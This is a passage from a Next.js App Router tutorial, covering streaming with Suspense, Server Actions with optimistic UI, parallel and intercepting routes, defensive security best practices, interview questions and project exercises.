  <text x="630" y="236" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">Server Render</text>
  <text x="630" y="252" text-anchor="middle" fill="#93c5fd" font-size="9">Auth + DB access</text>

  <!-- Streaming check -->
  <line x1="360" y1="180" x2="360" y2="210" stroke="#475569" stroke-width="1.5" marker-end="url(#rd1)"/>
  <rect x="280" y="210" width="160" height="50" rx="8" fill="#312e81"/>
  <text x="360" y="230" text-anchor="middle" fill="#c4b5fd" font-size="11" font-weight="600">Suspense?</text>
  <text x="360" y="246" text-anchor="middle" fill="#a78bfa" font-size="9">Streaming enabled</text>

  <!-- Stream â†’ Progressive HTML -->
  <line x1="360" y1="260" x2="360" y2="295" stroke="#a78bfa" stroke-width="1.5" marker-end="url(#rd4)"/>
  <rect x="250" y="295" width="220" height="45" rx="8" fill="#1e293b" stroke="#334155"/>
  <text x="360" y="314" text-anchor="middle" fill="#94a3b8" font-size="11" font-weight="600">Progressive HTML Stream</text>
  <text x="360" y="330" text-anchor="middle" fill="#64748b" font-size="9">Shell â†’ Components as data resolves</text>

  <defs>
    <marker id="rd1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#475569"/>
    </marker>
    <marker id="rd2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#34d399"/>
    </marker>
    <marker id="rd3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#f87171"/>
    </marker>
    <marker id="rd4" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#a78bfa"/>
    </marker>
  </defs>
</svg>
```

---

## 22.14 Practical Examples

### Dashboard Application with Streaming

```tsx
// app/dashboard/page.tsx
import { Suspense } from 'react';
import { RevenueChart } from '@/components/RevenueChart';
import { LatestInvoices } from '@/components/LatestInvoices';
import { CardSkeleton, ChartSkeleton } from '@/components/Skeletons';
import { fetchCardData } from '@/lib/data';

export default async function DashboardPage() {
  // Fast data â€” loaded immediately
  const cardData = await fetchCardData();

  return (
    <main>
      {/* Static data â€” renders immediately */}
      <SummaryCards data={cardData} />

      {/* Slow chart â€” streamed in with skeleton */}
      <Suspense fallback={<ChartSkeleton />}>
        <RevenueChart />
      </Suspense>

      {/* Latest invoices â€” streamed independently */}
      <Suspense fallback={<CardSkeleton />}>
        <LatestInvoices />
      </Suspense>
    </main>
  );
}
```

### Real-time Chat with Server Actions & Optimistic UI

```tsx
// app/chat/[roomId]/page.tsx
'use client';

import { useOptimistic, useRef } from 'react';
import { sendMessage } from '@/app/actions/chat';

interface Message {
  id: string;
  text: string;
  author: string;
  pending?: boolean;
}

export default function ChatRoom({
  roomId,
  initialMessages,
  userId,
}: {
  roomId: string;
  initialMessages: Message[];
  userId: string;
}) {
  const [optimisticMessages, addOptimisticMessage] = useOptimistic<
    Message[],
    string
  >(
    initialMessages,
    (state, newText) => [
      ...state,
      { id: crypto.randomUUID(), text: newText, author: userId, pending: true },
    ]
  );

  const ref = useRef<HTMLFormElement>(null);

  async function handleSubmit(formData: FormData) {
    const text = formData.get('message') as string;
    ref.current?.reset();

    // Optimistically add message immediately
    addOptimisticMessage(text);

    // Then send to server
    await sendMessage({ roomId, text, userId });
  }

  return (
    <div className="flex flex-col h-screen">
      <div className="flex-1 overflow-y-auto p-4 space-y-2">
        {optimisticMessages.map(msg => (
          <div
            key={msg.id}
            className={`p-2 rounded ${msg.pending ? 'opacity-50' : ''}`}
          >
            <span className="font-bold">{msg.author}:</span> {msg.text}
            {msg.pending && <span className="text-xs ml-2 text-gray-400">sending...</span>}
          </div>
        ))}
      </div>

      <form ref={ref} action={handleSubmit} className="p-4 flex gap-2">
        <input
          name="message"
          placeholder="Type a message..."
          className="flex-1 border rounded px-3 py-2"
          required
        />
        <button type="submit" className="px-4 py-2 bg-blue-600 text-white rounded">
          Send
        </button>
      </form>
    </div>
  );
}
```

### E-commerce with Parallel Routes + Intercepting

```tsx
// app/shop/@cart/default.tsx â€” Cart slot (always visible)
import { getCart } from '@/lib/cart';

export default async function CartSidebar() {
  const cart = await getCart();

  return (
    <div className="cart-sidebar">
      <h3>Cart ({cart.items.length})</h3>
      {cart.items.map(item => (
        <CartItem key={item.id} item={item} />
      ))}
      <p className="font-bold">Total: ${cart.total}</p>
    </div>
  );
}
```

```tsx
// app/shop/@modal/(.)product/[id]/page.tsx â€” Quick-view modal
import { Modal } from '@/components/Modal';
import { getProduct } from '@/lib/products';

export default async function QuickView({ params }: { params: { id: string } }) {
  const product = await getProduct(params.id);

  return (
    <Modal>
      <div className="p-6">
        <h2>{product.name}</h2>
        <p>{product.description}</p>
        <AddToCartButton productId={product.id} />
      </div>
    </Modal>
  );
}
```

---

## 22.15 Best Practices for Advanced Concepts

- âœ… Use Server Actions for all form mutations â€” eliminates boilerplate API routes
- âœ… Always validate Server Action inputs on the server (Zod) â€” client bypass is trivial
- âœ… Add `useFormStatus` to submit buttons to prevent double-submission
- âœ… Use `useOptimistic` for instant UI feedback on chat/list operations
- âœ… Tag fetches with `next: { tags: ['...'] }` for precise cache invalidation
- âœ… Wrap slow data-fetching components in `<Suspense>` for streaming
- âœ… Choose `cache: 'no-store'` only when data truly must be real-time
- âœ… Use Edge Runtime for auth/redirects, Node.js for heavy DB/file operations
- âœ… Use Parallel Routes for dashboards requiring independent data fetches
- âœ… Test static/dynamic rendering behavior with `next build && next start`

---

## 22.16 Common Mistakes in Advanced Concepts

| Mistake | Problem | Fix |
|---------|---------|-----|
| Marking Server Actions `'use client'` | Breaks â€” they must be `'use server'` | Move to separate `.ts` file with `'use server'` |
| Fetching same data in multiple components | N+1 requests | Use request memoization (same fetch URL) |
| No `Suspense` around slow components | Entire page waits | Wrap each slow component individually |
| Using `cache: 'no-store'` everywhere | Kills performance | Use it only for real-time data |
| Not calling `revalidatePath` after mutation | Stale UI after action | Always revalidate after Server Action |
| Mixing Edge + Node packages | Runtime crash | Check compatibility before setting `export const runtime = 'edge'` |
| No `default.tsx` in parallel route slots | 404 on direct navigation | Add `default.tsx` to every slot |

---

## 22.17 Interview Questions â€” Advanced Concepts

**Beginner:**
1. What is a Server Action in Next.js and how is it different from an API route?
2. What does `'use server'` mean at the top of a file?
3. How does `loading.tsx` use React Suspense under the hood?

**Intermediate:**
4. How do you invalidate the Next.js data cache after a Server Action mutation?
5. What is the difference between `revalidatePath` and `revalidateTag`?
6. When would you choose Edge Runtime over Node.js Runtime?

**Advanced:**
7. How does Next.js streaming work at the HTTP protocol level (transfer-encoding: chunked)?
8. Explain request memoization in Next.js â€” when does it apply and what are its limits?
9. Design the routing structure for a photo app where clicking a photo shows a modal, but direct URL access shows a full page.

---

# Summary

**Section 21 â€” Security Best Practices** establishes a defense-in-depth approach for Next.js applications. The key insight is that security is not a single feature â€” it's multiple overlapping layers: HTTPS encryption, security headers, rate limiting, authentication, authorization, input validation, and proper secrets management. Each layer independently reduces risk.

**Section 22 â€” Advanced Next.js Concepts** covers the features that separate production-grade Next.js applications from basic ones. Server Actions transform data mutation into typesafe, boilerplate-free operations. Streaming with Suspense delivers fast perceived performance by sending HTML progressively. Edge Runtime brings sub-10ms response times globally. Parallel and Intercepting Routes enable sophisticated UI patterns like modals and split dashboards without complex state management.

---

# Key Takeaways

1. **Never trust client-side security** â€” always verify auth, authorization, and input on the server
2. **`httpOnly` cookies beat `localStorage`** for tokens â€” XSS cannot reach them
3. **Return generic error messages** to clients â€” detailed errors belong in server logs
4. **Server Actions are not magic** â€” they still need auth, validation, and error handling
5. **`'use server'` is a directive, not a location** â€” can be at file or function level
6. **Streaming doesn't require extra code** â€” wrap components in `<Suspense>` and it works
7. **Cache aggressively, invalidate precisely** â€” use `revalidateTag` over `revalidatePath` when possible
8. **Edge Runtime has no Node.js** â€” check package compatibility before opting in
9. **Parallel Routes need `default.tsx`** â€” without it, direct navigation returns 404
10. **`useOptimistic` beats fake loading states** â€” gives instant, reversible UI feedback

---

# Practice Exercises

## Beginner
1. Add a Content Security Policy header to `next.config.js` and verify it in DevTools
2. Create a Server Action that adds an item to a database and calls `revalidatePath`
3. Wrap three sections of a page in `<Suspense>` with skeleton loaders and observe the streaming

## Intermediate
4. Implement rate limiting on a login API route (5 attempts per minute per IP)
5. Build a CSRF-protected form using the CSRF token pattern shown in Section 21.5
6. Create a dashboard with three parallel data fetches using Suspense streaming
7. Implement `useOptimistic` for a like button that updates instantly

## Advanced
8. Build a complete auth flow: register â†’ hashed password â†’ secure session cookie â†’ protected middleware
9. Design and implement an RBAC system with three roles (admin, editor, viewer) enforced in middleware
10. Create a photo gallery with intercepting routes â€” click shows modal, direct URL shows full page

---

# Mini Project Ideas

## 1. Secure Authentication App
Build a full authentication system from scratch.

**Features to implement:**
- Registration with bcrypt password hashing (cost 12)
- Login with rate limiting (5 attempts / minute)
- Secure `httpOnly` session cookie management
- Middleware-based route protection
- RBAC with three roles: admin, user, guest
- Protected admin panel with role check
- Audit log of all login events (IP, timestamp, success/fail)
- Password reset flow with time-limited tokens

**Security checklist:**
- No user enumeration on login/forgot password
- Generic error messages on all auth endpoints
- Env var validation with Zod at startup
- HTTPS enforced in production (HSTS header)

## 2. Real-time Dashboard
Build a metrics dashboard using streaming and caching.

**Features to implement:**
- Dashboard page with 4+ independent data sections
- Each section wrapped in `<Suspense>` with skeleton loaders
- Fastest sections render first (true streaming)
- Tag-based cache invalidation (`revalidateTag`)
- ISR for chart data (revalidate every 5 minutes)
- `cache: 'no-store'` for live counters only
- Server Actions for "mark as resolved" / status updates
- `useOptimistic` for instant UI on status changes

**Architecture to demonstrate:**
- Parallel data fetching within a single page
- Streaming vs static rendering side-by-side
- Edge Runtime for lightweight middleware checks

## 3. Chat Application
Build a real-time chat with Server Actions and optimistic UI.

**Features to implement:**
- Chat rooms with Parallel Routes sidebar layout
- Message sending via Server Actions (no API route)
- Optimistic message display (`useOptimistic`)
- Intercepting route for user profile preview on name click
- Rate limiting on message Server Action (1 msg/second)
- Input sanitization before DB storage
- Pagination with infinite scroll using Server Actions
- Typing indicators using optimistic state

**Advanced features:**
- Edge Runtime for message rate limiting
- Tag-based cache invalidation on new messages
- `useFormStatus` for send button pending state

---

# Interview Preparation

## Beginner Questions

| Question | Key Points |
|----------|-----------|
| What is XSS and how does React prevent it? | Auto-escaping in JSX; `dangerouslySetInnerHTML` is the risk |
| Why use `httpOnly` cookies for tokens? | JavaScript cannot read them â€” XSS-proof |
| What is a Server Action? | `'use server'` async function, called directly from components |
| What does `revalidatePath` do? | Purges Next.js data cache for a specific route |
| What is Suspense used for in Next.js? | Enables streaming â€” shows fallback while async component resolves |

## Intermediate Questions

| Question | Key Points |
|----------|-----------|
| Explain CSRF and two ways to prevent it | Forged cross-origin requests; SameSite cookies + Origin header check |
| Server Actions vs API Routes â€” when to use each? | SA for internal mutations; API routes for public HTTP endpoints |
| What is the difference between static and dynamic rendering? | Build-time vs request-time; triggered by `cookies()`, `headers()`, `no-store` |
| How does `revalidateTag` differ from `revalidatePath`? | Tag targets specific fetch calls; path targets all data on a route |
| When would you use Edge Runtime? | Auth, redirects, geo-routing; not DB connections or native modules |

## Advanced Scenario-Based Questions

**Scenario 1:** A penetration tester finds that your login endpoint returns "User not found" vs "Wrong password" â€” different error messages. What is the exact attack this enables and how do you fix it?
> **Answer:** User enumeration attack â€” attacker can build a list of valid email addresses. Fix: always return the same generic message ("Invalid email or password") and ensure both code paths take the same time (constant-time check).

**Scenario 2:** Your dashboard loads in 3 seconds because three slow API calls happen sequentially. How would you redesign this in Next.js?
> **Answer:** Move data fetching into individual Server Components, wrap each in `<Suspense>`, allowing them to fetch in parallel and stream progressively. The page shell renders immediately and data appears as it resolves.

**Scenario 3:** You need a product page that shows a modal when navigated from the product list, but shows a full page when accessed via direct URL. How do you implement this?
> **Answer:** Use Intercepting Routes with `(.)product/[id]` inside a `@modal` parallel route slot. The intercepting route renders the modal overlay; the original `product/[id]/page.tsx` renders the full page for direct access.

**Scenario 4:** After a Server Action saves a post, users see the old data until they refresh. What is wrong and how do you fix it?
> **Answer:** The Next.js Data Cache and Router Cache are stale. Fix: call `revalidatePath('/posts')` or `revalidateTag('posts')` at the end of the Server Action, and possibly `router.refresh()` on the client for Router Cache.

**Scenario 5:** Your security audit reveals JWTs are stored in `localStorage`. List the exact attack vectors and your remediation plan.
> **Answer:** Attack vectors: any XSS vulnerability can execute `localStorage.getItem('token')` and exfiltrate the JWT. Remediation: migrate to `httpOnly` session cookies (XSS-proof), set `secure`, `sameSite: 'lax'`, shorten JWT expiry, implement token rotation, add a CSP header to reduce XSS surface.

---

> **Next in the Series:** Part 5B will cover Internationalization (i18n), Performance Optimization, Web Vitals, and Building a Complete Full-Stack Application.

---

*Last updated: May 2026 Â· Next.js 14+ App Router Â· TypeScript*

